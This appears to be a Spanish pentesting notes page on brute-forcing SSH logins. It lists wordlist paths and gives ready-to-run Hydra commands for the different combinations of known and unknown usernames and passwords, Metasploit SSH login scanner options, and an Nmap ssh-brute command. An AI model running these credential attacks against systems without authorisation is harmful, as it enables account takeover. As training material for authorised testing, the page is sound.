---
description: En esta página aprenderás a enumerar y hacer fuerza bruta ante el servicio SSH
cover: >-
  https://images.unsplash.com/photo-1576502200916-3808e07386a5?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw2fHxnZW9tZXRyaWN8ZW58MHx8fHwxNjg5MjQxNDA2fDA&ixlib=rb-4.0.3&q=85
coverY: 278
---

# 22 - SSH

## Fuerza Bruta

{% hint style="success" %}
A la hora de emplear diccionarios se recomiendan los siguientes:

### Usuarios

```
/usr/share/wordlists/metasploit/unix_users.txt
```

### Contraseñas

```
/usr/share/wordlists/rockyou.txt
```
{% endhint %}

### Hydra

Para poder hacer fuerza bruta con hydra al servicio SSH, se pueden dar varios casos, en el caso de que tengas el usuario pero no la contraseña, deberás de usar un diccionario en este aspecto, por lo que el comando sería el siguiente

```bash
hydra -l user -P passwords.txt ssh://127.0.0.1 -t 15
```

En este caso con el parámetro `-l` le indicamos que sabemos el usuario y con el parámetro `-P` le indicamos la ruta donde esta el diccionario de contraseñas.

{% hint style="warning" %}
Puede que el servicio SSH no se encuentre en el puerto predefinido, en ese caso deberemos de especificar a hydra el puerto en el que está, esto se hace con el parámetro `-s`

```bash
hydra -l user -P passwords.txt ssh://127.0.0.1 -t 15 -s 2000
```
{% endhint %}

En el caso contrario de que no sepas el usuario pero si la contraseña, los parámetros querían así:

```bash
hydra -L users.txt -p Password123 ssh://127.0.0.1 -t 15
```

En este comando, le indicamos la ruta del diccionario de usuarios con el parámetro en mayúscula y una contraseña en concreto con el parámetro en minúscula. En el otro posible caso de que no tengamos ni la contraseña ni el usuario, pondremos los dos parámetros en mayúscula pasándole como valor la ruta del diccionario tanto de usuarios como de contraseñas.

```bash
hydra -L users.txt -P passwords.txt ssh://127.0.0.1 -t 15
```

### Metasploit

Para esto, usaremos el modulo "SSH Login Check Scanner". Deberemos de configurar las siguientes opciones:

* USERNAME -> En el caso de que usemos un usuario concreto
* USER\_FILE -> En el caso de que usemos un diccionario de usuarios
* PASSWORD -> En el caso de que usemos una contraseña concreta
* PASS\_FILE -> En el caso de que usemos un diccionario de contraseñas
* RHOSTS -> IP de la máquina victima

### Nmap

Podemos emplear el script "`ssh-brute`" para usar fuerza bruta. En este caso no es necesario especificar un diccionario de contraseñas, solo de usuarios:

```bash
nmap -p 22 --script ssh-brute --script-args userdb=/root/users 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
